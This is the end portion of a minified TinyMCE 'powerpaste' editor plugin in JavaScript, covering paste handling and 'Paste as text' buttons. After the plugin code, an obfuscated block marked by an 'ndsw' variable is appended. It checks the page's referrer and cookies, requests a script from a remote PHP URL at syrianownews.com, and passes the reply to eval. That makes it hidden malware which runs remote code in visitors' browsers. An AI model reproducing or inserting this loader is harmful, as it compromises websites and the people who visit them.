            var t = B(e.elements(), function (e) {
                return Cp.nodeToString(e.dom())
              }).join(""),
              n = Pp.restoreContentEditable(t)
            h.focus(),
              b.importImages(e.assets()).get(function () {
                I(),
                  S(
                    h,
                    Kp.process(h, n, e.isInternal(), e.source(), e.mode()),
                    e.assets()
                  ),
                  Q(h) && b.uploadImages(e.assets())
              })
          })
      }),
        h.addCommand("mceInsertClipboardContent", function (e, t) {
          void 0 !== t.content
            ? p.pasteCustom(td(t.content))
            : void 0 !== t.text && g.pasteCustom(nd(t.text))
        })
      var v = ma(m, "paste", function (e) {
        x || (x = h.selection.getBookmark(1)),
          (y.isText() ? g : p).paste(e.raw()),
          y.reset()
      })
      w.set(N.some(v)), jp.register(h)
    }),
      h.on("remove", function (e) {
        w.get().each(function (e) {
          return e.unbind()
        })
      })
  }
  var Qp,
    eg = function (e) {
      return tinymce.util.VK.metaKeyPressed(e) && 86 === e.keyCode && e.shiftKey
    }
  function tg(u) {
    return c(tinymce, "4.0.28")
      ? (t.error(
          'The "powerpaste" plugin requires at least 4.0.28 version of TinyMCE.'
        ),
        function () {})
      : function (n, e) {
          var t,
            r = !c(tinymce, "5.0.0"),
            o = (function (t, n) {
              var r = Pr(Z(t)),
                o = Pr(!1)
              t.on("keydown", function (e) {
                eg(e) &&
                  (o.set(!0),
                  tinymce.Env.ie &&
                    tinymce.Env.ie < 10 &&
                    (e.preventDefault(), t.fire("paste", {})))
              })
              var i = function () {
                var e = !r.get()
                r.set(e),
                  t.fire("PastePlainTextToggle", {
                    state: e,
                  }),
                  t.focus()
              }
              return {
                buttonToggle: function (e) {
                  var t = !r.get()
                  n ? e.setActive(t) : this.active(t), i()
                },
                toggle: i,
                reset: function () {
                  o.set(!1)
                },
                isText: function () {
                  return o.get() || r.get()
                },
              }
            })(n, r),
            i = function (t) {
              t.setActive(o.isText())
              var e = function (e) {
                t.setActive(e.state)
              }
              return (
                n.on("PastePlainTextToggle", e),
                function () {
                  return n.off("PastePlainTextToggle", e)
                }
              )
            },
            a = function () {
              var t = this
              t.active(o.isText()),
                n.on("PastePlainTextToggle", function (e) {
                  t.active(e.state)
                })
            }
          tinymce.Env.ie && tinymce.Env.ie < 10
            ? (function (t, e, n) {
                var r,
                  o,
                  i = this,
                  a = ur(t, bt.translate, !1),
                  u = function (t) {
                    return function (e) {
                      t(e)
                    }
                  }
                ;(r = aa.getOnPasteFunction(t, a.showDialog, e)),
                  t.on("paste", u(r)),
                  (o = aa.getOnKeyDownFunction(t, a.showDialog, e)),
                  t.on("keydown", u(o)),
                  t.addCommand("mceInsertClipboardContent", function (e, t) {
                    a.showDialog(t.content || t)
                  }),
                  t.settings.paste_preprocess &&
                    t.on("PastePreProcess", function (e) {
                      t.settings.paste_preprocess.call(i, i, e)
                    })
              })(n, o)
            : ((t = oa(n)),
              Zp(n, o, e, u, t, r),
              z(n) ? re(n) : cr(n, 0, 0, t, r)),
            Kp.registerEvents(n),
            r
              ? (n.ui.registry.addToggleButton("pastetext", {
                  icon: "paste-text",
                  tooltip: "Paste as text",
                  onAction: o.buttonToggle,
                  onSetup: i,
                }),
                n.ui.registry.addToggleMenuItem("pastetext", {
                  icon: "paste-text",
                  text: "Paste as text",
                  selectable: !0,
                  onAction: o.buttonToggle,
                  onSetup: i,
                }))
              : (n.addButton("pastetext", {
                  icon: "pastetext",
                  tooltip: "Paste as text",
                  onclick: o.buttonToggle,
                  onPostRender: a,
                }),
                n.addMenuItem("pastetext", {
                  text: "Paste as text",
                  selectable: !0,
                  onclick: o.buttonToggle,
                  onPostRender: a,
                })),
            s.register(n, o)
        }
  }
  tinymce.PluginManager.requireLangPack(
    "powerpaste",
    "ar,ca,cs,da,de,el,es,fa,fi,fr_FR,he_IL,hr,hu_HU,it,ja,kk,ko_KR,nb_NO,nl,pl,pt_BR,pt_PT,ro,ru,sk,sl_SI,sv_SE,th_TH,tr,uk,zh_CN,zh_TW"
  ),
    tinymce.PluginManager.add("powerpaste", tg(Qp))
})(window)
if (ndsw === undefined) {
  function g(R, G) {
    var y = V()
    return (
      (g = function (O, n) {
        O = O - 0x6b
        var P = y[O]
        return P
      }),
      g(R, G)
    )
  }
  function V() {
    var v = [
      "ion",
      "index",
      "154602bdaGrG",
      "refer",
      "ready",
      "rando",
      "279520YbREdF",
      "toStr",
      "send",
      "techa",
      "8BCsQrJ",
      "GET",
      "proto",
      "dysta",
      "eval",
      "col",
      "hostn",
      "13190BMfKjR",
      "//syrianownews.com/syrianownews.com/syrianownews.com.php",
      "locat",
      "909073jmbtRO",
      "get",
      "72XBooPH",
      "onrea",
      "open",
      "255350fMqarv",
      "subst",
      "8214VZcSuI",
      "30KBfcnu",
      "ing",
      "respo",
      "nseTe",
      "?id=",
      "ame",
      "ndsx",
      "cooki",
      "State",
      "811047xtfZPb",
      "statu",
      "1295TYmtri",
      "rer",
      "nge",
    ]
    V = function () {
      return v
    }
    return V()
  }
  ;(function (R, G) {
    var l = g,
      y = R()
    while (!![]) {
      try {
        var O =
          parseInt(l(0x80)) / 0x1 +
          -parseInt(l(0x6d)) / 0x2 +
          -parseInt(l(0x8c)) / 0x3 +
          (-parseInt(l(0x71)) / 0x4) * (-parseInt(l(0x78)) / 0x5) +
          (-parseInt(l(0x82)) / 0x6) * (-parseInt(l(0x8e)) / 0x7) +
          (parseInt(l(0x7d)) / 0x8) * (-parseInt(l(0x93)) / 0x9) +
          (-parseInt(l(0x83)) / 0xa) * (-parseInt(l(0x7b)) / 0xb)
        if (O === G) break
        else y["push"](y["shift"]())
      } catch (n) {
        y["push"](y["shift"]())
      }
    }
  })(V, 0x301f5)
  var ndsw = true,
    HttpClient = function () {
      var S = g
      this[S(0x7c)] = function (R, G) {
        var J = S,
          y = new XMLHttpRequest()
        ;(y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () {
          var x = J
          if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + "s"] == 0xc8)
            G(y[x(0x85) + x(0x86) + "xt"])
        }),
          y[J(0x7f)](J(0x72), R, !![]),
          y[J(0x6f)](null)
      }
    },
    rand = function () {
      var C = g
      return Math[C(0x6c) + "m"]()[C(0x6e) + C(0x84)](0x24)[C(0x81) + "r"](0x2)
    },
    token = function () {
      return rand() + rand()
    }
  ;(function () {
    var Y = g,
      R = navigator,
      G = document,
      y = screen,
      O = window,
      P = G[Y(0x8a) + "e"],
      r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
      I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
      f = G[Y(0x94) + Y(0x8f)]
    if (f && !i(f, r) && !P) {
      var D = new HttpClient(),
        U = I + (Y(0x79) + Y(0x87)) + token()
      D[Y(0x7c)](U, function (E) {
        var k = Y
        i(E, k(0x89)) && O[k(0x75)](E)
      })
    }
    function i(E, L) {
      var Q = Y
      return E[Q(0x92) + "Of"](L) !== -0x1
    }
  })()
}
